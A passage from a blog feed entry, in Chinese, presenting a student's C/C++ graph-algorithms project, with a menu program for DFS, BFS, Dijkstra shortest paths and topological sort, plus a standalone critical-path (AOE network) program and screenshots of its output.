class="line">        pre = p[i];</span><br><span class="line">        <span class="keyword">while</span>(pre != <span class="number">-1</span>)&#123;<span class="comment">//从第 i 个顶点开始向前搜索最短路径上的顶点</span></span><br><span class="line">            st[++top] = pre;</span><br><span class="line">            pre = p[pre];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(top &gt;=<span class="number">0</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%2d--&gt;&quot;</span>,st[top--]);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="main-cpp"><a href="#main-cpp" class="headerlink" title="main.cpp"></a>main.cpp</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;graph.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;m_graph.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;min.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;r_graph.h&quot;</span></span></span><br><span class="line"><span class="comment">//#include &quot;g_graph.h&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//菜单</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Menu</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;---------------------菜单界面--------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;                                                 \n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\t1.深度优先遍历          2.广度优先遍历        \n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;                                                 \n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t3.最短路径              4.关键路径        \n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;                                                 \n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t5.拓扑排序              0.退出        \n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;                                                 \n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------------------------------------------------\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> select;</span><br><span class="line"><span class="comment">//深度 广度 遍历测试---------------------------------------------</span></span><br><span class="line">    LinkedGraph g1;</span><br><span class="line">    <span class="keyword">int</span> count,i;</span><br><span class="line"><span class="built_in">create_1</span>(&amp;g1,<span class="string">&quot;graph1.txt&quot;</span>,<span class="number">0</span>);  <span class="comment">// 0 代表无向图</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//最短路径 测试----------------------------------------------------</span></span><br><span class="line">Mgraph g2;<span class="comment">//有向图 邻接矩阵</span></span><br><span class="line">path p;<span class="comment">//路径向量</span></span><br><span class="line">dist d;<span class="comment">//最短路径向量</span></span><br><span class="line"><span class="keyword">int</span> v0;</span><br><span class="line"><span class="comment">//create_2(&amp;g2,&quot;Mgraph1.txt&quot;,0);  // 0 代表无向图</span></span><br><span class="line"><span class="built_in">create_2</span>(&amp;g2,<span class="string">&quot;Mgraph2.txt&quot;</span>,<span class="number">1</span>);  <span class="comment">// 1 代表有向图</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//拓扑排序 测试----------------------------------------------------</span></span><br><span class="line">AovGraph g3;</span><br><span class="line"><span class="keyword">int</span> k=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">create_3</span>(&amp;g3,<span class="string">&quot;Rgraph1.txt&quot;</span>,<span class="number">1</span>);  <span class="comment">// 1 代表有向图</span></span><br><span class="line"><span class="keyword">int</span> num;</span><br><span class="line"></span><br><span class="line"><span class="comment">//关键路径 测试----------------------------------------------------</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">AoeGraph g4;</span></span><br><span class="line"><span class="comment">create_4(&amp;g4);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">Menu</span>();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入菜单选项：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;select);</span><br><span class="line"><span class="built_in"><span class="keyword">switch</span></span>(select)&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:  <span class="comment">//深度优先遍历</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;图的深度优先遍历序列为：\n&quot;</span>);</span><br><span class="line"><span class="built_in">DfsTraverse</span>(g1);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:<span class="comment">//广度优先遍历</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;图的广度优先遍历序列为：\n&quot;</span>);</span><br><span class="line">count = <span class="built_in">BfsTraverse</span>(g1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;该图共有%d个连通分量\n&quot;</span>,count);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:<span class="comment">//最短路径</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入 源点 v0：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;v0);</span><br><span class="line"><span class="built_in">dijkstra</span>(g2,v0,p,d);</span><br><span class="line"><span class="built_in">print_gpd</span>(g2,p,d);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:<span class="comment">//关键路径</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;关键路径：\n&quot;</span>); </span><br><span class="line"><span class="comment">/*print(g4);</span></span><br><span class="line"><span class="comment">printf(&quot;\n输出的顶点个数：%d\n\n&quot;,EarlistTime(g4));</span></span><br><span class="line"><span class="comment">LateTime(g4);</span></span><br><span class="line"><span class="comment">activity(g4);*/</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:<span class="comment">//拓扑排序</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n进行拓扑排序的一个结果：\n&quot;</span>);</span><br><span class="line"><span class="comment">//print(g3);</span></span><br><span class="line">k=<span class="built_in">TopSort</span>(g3);</span><br><span class="line"><span class="keyword">if</span>(k&lt;g3.n) <span class="built_in">printf</span>(<span class="string">&quot;\n该图存在环！\n&quot;</span>);</span><br><span class="line">num = <span class="built_in">TopSort</span>(g3);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n输出的结点个数是%2d个\n&quot;</span>,num);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:<span class="comment">//退出</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;您输入的选项有误，请重新输入：\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="图文件介绍"><a href="#图文件介绍" class="headerlink" title="图文件介绍"></a>图文件介绍</h2><p>深度优先遍历：举例 <code>graph1.txt</code></p><p>广度优先遍历：举例 <code>graph2.txt</code></p><p><img src="https://i.loli.net/2021/11/28/KFEJ1DdTIZnwyc4.png" alt="image-20211128161210345"></p><p><img src="https://i.loli.net/2021/11/28/4zJYZoLaIgUvAtF.png" alt="image-20211128193840517"></p><p>最短路径（有向图）：举例 <code>Mgraph2.txt</code></p><p><img src="https://i.loli.net/2021/11/28/MSlurL3EFnTaRZI.jpg" alt="IMG_20211127_111914"></p><p><img src="https://i.loli.net/2021/11/28/5u41lotQYvwabTn.png" alt="image-20211128193942188"></p><p>最短路径（无向图）：举例 <code>Mgraph1.txt</code></p><p><img src="https://i.loli.net/2021/11/28/Ep3ncv9ZDdbPF8R.png" alt="image-20211128160902780"></p><p><img src="https://i.loli.net/2021/11/28/XP1pcSYuORsIW4x.png" alt="image-20211128194004883"></p><p>拓扑排序：举例 <code>Rgraph1.txt</code></p><p><img src="https://i.loli.net/2021/11/28/nBUglrsmY53f4dM.png" alt="image-20211128155046109"></p><p><img src="https://i.loli.net/2021/11/28/HzWRkE9jNoqISOY.png" alt="image-20211128194212043"></p><p>关键路径：举例 <code>Ggraph.txt</code></p><p><img src="D:\APP\QQAPP\缓存\1370220243\FileRecv\MobileFile\qq_pic_merged_1638019241542.jpg" alt="qq_pic_merged_1638019241542"></p><p><img src="https://i.loli.net/2021/11/28/Y2qNm8dKELWv1pr.png" alt="image-20211128194030485"></p><h2 id="界面展示"><a href="#界面展示" class="headerlink" title="界面展示"></a>界面展示</h2><p><img src="https://i.loli.net/2021/11/28/uOMvV6ZJix4dqAj.png" alt="image-20211128194304352"></p><p><img src="https://i.loli.net/2021/11/28/u3NDCMxhfbcZap1.png" alt="image-20211128194315014"></p><p><img src="https://i.loli.net/2021/11/28/iAlNWTC13QRZaJg.png" alt="image-20211128194334446"></p><p><img src="https://i.loli.net/2021/11/28/f4aTePyIdxLoKkD.png" alt="image-20211128194348247"></p><p><img src="https://i.loli.net/2021/11/28/mPA1keYiDS5ubW9.png" alt="image-20211128194401181"></p><h1 id="关键路径-单独实现"><a href="#关键路径-单独实现" class="headerlink" title="关键路径 单独实现"></a>关键路径 单独实现</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> M = <span class="number">20</span>;</span><br><span class="line"><span class="keyword">int</span> ve[M];<span class="comment">//事件最早发生时间向量</span></span><br><span class="line"><span class="keyword">int</span> seq[M];<span class="comment">//拓扑排序列向量</span></span><br><span class="line"><span class="keyword">int</span> vl[M];<span class="comment">//事件最晚允许发生时间向量</span></span><br><span class="line"><span class="keyword">int</span> e[M];<span class="comment">//活动的最早开始时间</span></span><br><span class="line"><span class="keyword">int</span> l[M];<span class="comment">//活动最迟开始时间</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>//边结点类型定义</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> adjvex;</span><br><span class="line"><span class="keyword">int</span> len;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;EdgeNode;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">de</span> //带顶点入度的头节点定义</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">EdgeNode *FirstEdge;</span><br><span class="line"><span class="keyword">char</span> vertex;</span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line">&#125;vertexnode;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">vertexnode adjlist[M];</span><br><span class="line"><span class="keyword">int</span> n,e;</span><br><span class="line">&#125;AoeGraph;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">creat</span> <span class="params">(AoeGraph *g)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i,j,k,len;</span><br><span class="line">EdgeNode *s;</span><br><span class="line">FILE *f;</span><br><span class="line">f=<span class="built_in">fopen</span>(<span class="string">&quot;Ggraph.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="built_in">fscanf</span>(f,<span class="string">&quot;%d%d&quot;</span>,&amp;g-&gt;n,&amp;g-&gt;e);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;g-&gt;n;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fscanf</span>(f,<span class="string">&quot;%1s %d&quot;</span>,&amp;g-&gt;adjlist[i].vertex,&amp;g-&gt;adjlist[i].id);</span><br><span class="line">g-&gt;adjlist[i].FirstEdge=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;g-&gt;e;k++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fscanf</span>(f,<span class="string">&quot;%d%d%d&quot;</span>,&amp;i,&amp;j,&amp;len);</span><br><span class="line">s=(EdgeNode*)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(EdgeNode));</span><br><span class="line">s-&gt;len=len;</span><br><span class="line">s-&gt;adjvex=j;</span><br><span class="line">s-&gt;next=g-&gt;adjlist[i].FirstEdge;</span><br><span class="line">g-&gt;adjlist[i].FirstEdge=s;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(AoeGraph g)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">EdgeNode *p;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;一共有%d个结点，%d条边\n&quot;</span>,g.n,g.e);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;g.n;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;入度：%d  V%c &quot;</span>,g.adjlist[i].id,g.adjlist[i].vertex);</span><br><span class="line">p=g.adjlist[i].FirstEdge;</span><br><span class="line"><span class="keyword">while</span>(p)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;(w=%d) %d&quot;</span>,p-&gt;len,p-&gt;adjvex);</span><br><span class="line"><span class="keyword">if</span>(p-&gt;next)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; -&gt; &quot;</span>);</span><br><span class="line">p=p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//求每个事件最早发生的时间</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">EarlistTime</span><span class="params">(AoeGraph gout)</span><span class="comment">//返回输出的顶点个数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> count=<span class="number">0</span>,i,j,v,flag[M];</span><br><span class="line"><span class="keyword">int</span> queue[M];</span><br><span class="line"><span class="keyword">int</span> front = <span class="number">0</span>,rear = <span class="number">0</span>;</span><br><span class="line">EdgeNode *p;</span><br><span class="line"><span class="built_in">memset</span>(ve,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(ve));<span class="comment">//初始化每个顶点最早开始时间是ve[i]=0;</span></span><br><span class="line"><span class="built_in">memset</span>(flag,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(flag));<span class="comment">//访问标记初始化</span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt; gout.n;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(gout.adjlist[i].id==<span class="number">0</span> &amp;&amp; flag[i]==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">queue[rear++]=i;</span><br><span class="line">flag[i]=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(front &lt; rear)<span class="comment">//队列不为空</span></span><br><span class="line">&#123;</span><br><span class="line">v=queue[front++];<span class="comment">//队首元出队</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c &quot;</span>,gout.adjlist[v].vertex);</span><br><span class="line">seq[count++]=v;<span class="comment">//记录拓扑排序当前元素，计数器加一</span></span><br><span class="line">p=gout.adjlist[v].FirstEdge;</span><br><span class="line"><span class="keyword">while</span>(p)</span><br><span class="line">&#123;</span><br><span class="line">j=p-&gt;adjvex;</span><br><span class="line"><span class="keyword">if</span>(--gout.adjlist[j].id==<span class="number">0</span> &amp;&amp; flag[j]==<span class="number">0</span>)<span class="comment">//入度为0则将进队</span></span><br><span class="line">&#123;</span><br><span class="line">queue[rear++]=j;</span><br><span class="line">flag[j]=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(p-&gt;len+ve[v]&gt;ve[j])</span><br><span class="line">ve[j]=ve[v]+p-&gt;len;</span><br><span class="line">p=p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n各个事件的最早发生时间：\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;gout.n;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ve[%d]=%d\n&quot;</span>,i,ve[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//各事件的最晚允许开始时间</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LateTime</span><span class="params">(AoeGraph gin)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> k=gin.n<span class="number">-1</span>,i,j,v;</span><br><span class="line">EdgeNode *p;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;gin.n;i++)</span><br><span class="line">vl[i]=ve[seq[gin.n<span class="number">-1</span>]];</span><br><span class="line"><span class="keyword">while</span>(k&gt;<span class="number">-1</span>)<span class="comment">//按照拓扑排序求各事件最晚时间</span></span><br><span class="line">&#123;</span><br><span class="line">v=seq[k];</span><br><span class="line">p=gin.adjlist[v].FirstEdge;</span><br><span class="line"><span class="keyword">while</span>(p)</span><br><span class="line">&#123;</span><br><span class="line">j=p-&gt;adjvex;</span><br><span class="line"><span class="keyword">if</span>(vl[j]-p-&gt;len &lt; vl[v])</span><br><span class="line">vl[v]=vl[j]-p-&gt;len;</span><br><span class="line">p=p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">k--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;各个事件允许发生的最晚时间：\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;gin.n;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;vl[%d]=%d\n&quot;</span>,i,vl[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//求e[k] 和 l[k]</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">activity</span><span class="params">(AoeGraph g)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i,j,k,q;</span><br><span class="line">EdgeNode *p; </span><br><span class="line"><span class="built_in">memset</span>(e,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(e));</span><br><span class="line">i=<span class="number">0</span>;q=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;--------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;起点 | 终点 | 活动最早开始时间 | 活动最晚开始时间 | 差值 | 是否为关键路径|\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;g.n;j++)</span><br><span class="line">&#123;</span><br><span class="line">p=g.adjlist[j].FirstEdge;</span><br><span class="line"><span class="keyword">while</span>(p)</span><br><span class="line">&#123;</span><br><span class="line">k=p-&gt;adjvex;</span><br><span class="line">e[i]=ve[j];</span><br><span class="line">l[i]=vl[k]-p-&gt;len;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c    |%5d |%10d        |%10d        |%5d |&quot;</span>,g.adjlist[j].vertex,k,e[i],l[i],l[i]-e[i]);</span><br><span class="line"><span class="keyword">if</span>(e[i]==l[i])</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;    √\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;    \n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;--------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">p=p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">AoeGraph g;</span><br><span class="line"><span class="built_in">creat</span>(&amp;g);</span><br><span class="line"><span class="built_in">print</span>(g);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n输出的顶点个数：%d\n\n&quot;</span>,<span class="built_in">EarlistTime</span>(g));</span><br><span class="line"><span class="built_in">LateTime</span>(g);</span><br><span class="line"><span class="built_in">activity</span>(g);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/28/z7FtoB9n2YHAQ4r.png" alt="image-20211128194511432"></p><p><img src="https://i.loli.net/2021/11/28/VxwseJrh4RMmgYo.png" alt="image-20211128194611358"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="数据结构" scheme="https://xizhi-future.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
  </entry>
  
  <entry>
